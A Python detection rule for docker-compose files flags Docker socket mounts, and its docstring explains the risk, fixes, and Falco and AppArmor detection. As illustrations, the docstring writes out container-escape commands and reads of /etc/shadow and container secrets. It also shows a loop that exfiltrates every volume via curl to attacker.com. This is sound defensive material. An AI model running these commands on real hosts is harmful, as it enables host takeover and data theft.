"""
COMPOSE-SEC-002: Docker Socket Exposed to Container

Security Impact: CRITICAL
CWE: CWE-250 (Execution with Unnecessary Privileges)

DESCRIPTION:
This rule detects docker-compose services that mount the Docker socket
(/var/run/docker.sock or /run/docker.sock) as a volume. The Docker socket is
owned by root and provides complete control over the Docker daemon. Giving a
container access to it is equivalent to giving unrestricted root access to the
host system.

This is identical to DOCKER-SEC-006 but for docker-compose configurations.

SECURITY IMPLICATIONS:

The Docker socket is a Unix socket that controls the Docker daemon. Any process
with access to this socket can:

1. **Create Privileged Containers**:
   ```bash
   # Inside container with Docker socket access
   docker run --rm -it --privileged -v /:/host alpine chroot /host /bin/bash
   # Now root on host
   ```

2. **Mount Host Filesystem**:
   ```bash
   docker run -v /etc:/host_etc alpine cat /host_etc/shadow
   # Read any host file
   ```

3. **Execute Commands on Host**:
   ```bash
   docker run -v /:/host alpine nsenter --target 1 --mount --uts --ipc --net --pid -- bash
   # Execute as host PID 1
   ```

4. **Access All Containers**:
   ```bash
   docker exec other_container cat /app/secrets.env
   # Access other containers' data
   ```

5. **Deploy Malware**:
   ```bash
   docker run -d --restart=always malware:latest
   # Persistent malware container
   ```

VULNERABLE EXAMPLE:
```yaml
version: '3.8'
services:
  # CRITICAL SECURITY ISSUE
  portainer:
    image: portainer/portainer-ce
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock  # DANGEROUS!
    ports:
      - "9000:9000"
```

If Portainer is compromised (CVE, weak password, etc.):
- Attacker has full Docker control
- Can create privileged containers
- Can access all data on host
- Can deploy persistent backdoors

**Real-world attack scenario**:
1. Attacker finds XSS in Portainer web UI
2. Steals admin session cookie
3. Uses Portainer API to create privileged container
4. Mounts host / filesystem
5. Installs rootkit on host
6. Establishes persistence via systemd

SECURE ALTERNATIVES:

**Solution 1: Docker Socket Proxy with Restrictions**
```yaml
version: '3.8'
services:
  # Restricted proxy - only allows specific operations
  docker-proxy:
    image: tecnativa/docker-socket-proxy
    environment:
      CONTAINERS: 1      # Allow listing containers
      IMAGES: 1          # Allow listing images
      POST: 0            # Deny container creation
      DELETE: 0          # Deny deletion
      BUILD: 0           # Deny builds
      EXEC: 0            # Deny exec
      VOLUMES: 0         # Deny volume access
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
    networks:
      - proxy_net

  # App connects to proxy, not real socket
  monitor:
    image: monitoring-tool
    environment:
      DOCKER_HOST: tcp://docker-proxy:2375
    networks:
      - proxy_net
    # No direct socket access!

networks:
  proxy_net:
    internal: true  # No internet access
```

**Solution 2: Read-Only Socket Access**
```yaml
services:
  monitor:
    image: cadvisor
    volumes:
      # Read-only access - can't create containers
      - /var/run/docker.sock:/var/run/docker.sock:ro
    # Still risky - read access reveals secrets in env vars
```

**Solution 3: Use Docker API via TCP with TLS**
```yaml
# On host: Configure Docker daemon for TLS
# /etc/docker/daemon.json
{
  "hosts": ["tcp://0.0.0.0:2376"],
  "tls": true,
  "tlscacert": "/etc/docker/ca.pem",
  "tlscert": "/etc/docker/server-cert.pem",
  "tlskey": "/etc/docker/server-key.pem",
  "tlsverify": true
}

# In docker-compose: Use TCP connection
services:
  app:
    image: myapp
    environment:
      DOCKER_HOST: tcp://host:2376
      DOCKER_TLS_VERIFY: 1
    volumes:
      - ./certs:/certs:ro
    # No socket mount needed
```

**Solution 4: Rootless Docker**
```yaml
services:
  builder:
    image: docker:dind-rootless
    environment:
      DOCKER_TLS_CERTDIR: ""
    # Runs Docker as non-root user
    # Limited capabilities
```

**Solution 5: Alternative Tools**
```yaml
# Instead of Docker-in-Docker with socket
services:
  # Use Kaniko for building (no Docker daemon needed)
  builder:
    image: gcr.io/kaniko-project/executor:latest
    # No socket access required

  # Use BuildKit
  buildkit:
    image: moby/buildkit:latest
    # Rootless mode available

  # Use Podman (daemonless)
  podman:
    image: quay.io/podman/stable
    # No socket needed
```

LEGITIMATE USE CASES:

Very few scenarios genuinely require Docker socket access:

1. **Container Management UIs** (Portainer, Rancher)
   - Must be isolated on management network
   - Require strong authentication
   - Should use read-only socket if possible

2. **CI/CD Runners** (GitLab Runner, Jenkins with Docker)
   - Consider using Kaniko or BuildKit instead
   - If socket required, use dedicated isolated CI infrastructure

3. **Monitoring Tools** (cAdvisor, Prometheus exporters)
   - Should use read-only socket
   - Network isolation critical

4. **Log Aggregation** (Fluentd, Logstash)
   - Read-only socket access only
   - Limit network exposure

EVEN IN LEGITIMATE CASES:
- Document security exception
- Implement network segmentation
- Use read-only when possible
- Monitor for abuse
- Regular security audits

ATTACK EXAMPLES:

**Example 1: Container Escape via New Container**
```bash
# Attacker in container with socket access
docker run --rm -it --pid=host --privileged ubuntu bash

# Inside new privileged container
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# Now running as host root
```

**Example 2: Secret Extraction**
```bash
# List all containers and inspect environment variables
docker ps -q | xargs docker inspect --format='{{.Config.Env}}'
# Reveals API keys, database passwords, etc.
```

**Example 3: Malware Deployment**
```bash
# Deploy persistent cryptocurrency miner
docker run -d \
  --restart=always \
  --name system_updater \
  --cpus=0.5 \
  miner:latest
```

**Example 4: Data Exfiltration**
```bash
# Mount and exfiltrate all volumes
for vol in $(docker volume ls -q); do
  docker run --rm -v $vol:/data alpine tar -czf - /data | \
    curl -F "file=@-" https://attacker.com/upload
done
```

DETECTION AND PREVENTION:

**Pre-deployment scanning**:
```bash
# Check for Docker socket mounts
grep -r "docker.sock" docker-compose.yml
```

**CI/CD gate**:
```yaml
- name: Block Docker socket mounts
  run: |
    if grep -q "/var/run/docker.sock" docker-compose.yml; then
      echo "ERROR: Docker socket mount detected"
      exit 1
    fi
```

**Runtime detection (Falco)**:
```yaml
- rule: Docker Socket Mounted
  desc: Container has Docker socket mounted
  condition: >
    container.mount.dest contains "/var/run/docker.sock"
  output: "Docker socket mounted (container=%container.name image=%container.image)"
  priority: CRITICAL
```

**AppArmor profile** to block socket access:
```
# /etc/apparmor.d/docker-no-socket
profile docker-no-socket flags=(attach_disconnected,mediate_deleted) {
  # Deny access to Docker socket
  deny /var/run/docker.sock rw,
  deny /run/docker.sock rw,
}
```

MONITORING:

**Audit container mounts**:
```bash
docker ps -q | xargs docker inspect --format='{{.Name}}: {{.Mounts}}' | \
  grep docker.sock
```

**Alert on socket access**:
```bash
#!/bin/bash
# Monitor for new containers with socket access
while true; do
  docker events --filter 'event=start' --format '{{.Actor.ID}}' | \
    while read id; do
      if docker inspect $id | grep -q "docker.sock"; then
        echo "ALERT: Container $id has Docker socket access"
        # Send to SIEM/alerting system
      fi
    done
  sleep 5
done
```

REMEDIATION:

**Immediate action**:
```yaml
# Remove socket mount
services:
  app:
    volumes:
      # - /var/run/docker.sock:/var/run/docker.sock  # DELETE
```

**If monitoring is needed**:
```yaml
# Use restricted proxy
services:
  docker-proxy:
    image: tecnativa/docker-socket-proxy
    environment:
      CONTAINERS: 1
      POST: 0
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro

  monitor:
    environment:
      DOCKER_HOST: tcp://docker-proxy:2375
```

**If building is needed**:
```yaml
# Replace with Kaniko
services:
  builder:
    image: gcr.io/kaniko-project/executor:latest
    # No Docker socket required!
```

REFERENCES:
- CWE-250: Execution with Unnecessary Privileges
- Docker Socket Security Advisory
- CIS Docker Benchmark: Section 5.31
- OWASP Docker Security Cheat Sheet
- Tecnativa Docker Socket Proxy documentation
"""

from rules.container_decorators import compose_rule
from rules.container_matchers import service_has


@compose_rule(
    id="COMPOSE-SEC-002",
    name="Docker Socket Exposed to Container",
    severity="CRITICAL",
    cwe="CWE-250",
    category="security",
    tags="docker-compose,compose,docker-socket,volume,security,privilege-escalation,container-escape,daemon,critical,host-access",
    message="Service mounts Docker socket. The owner of this socket is root. Giving container access to it is equivalent to giving unrestricted root access to host."
)
def docker_socket_exposed():
    """
    Detects Docker socket mounted as volume.

    Mounting /var/run/docker.sock gives the container full control over
    the Docker daemon, allowing container escape, privilege escalation,
    and complete host compromise.
    """
    return service_has(
        key="volumes",
        contains_any=[
            "/var/run/docker.sock",
            "/run/docker.sock",
            "docker.sock"
        ]
    )
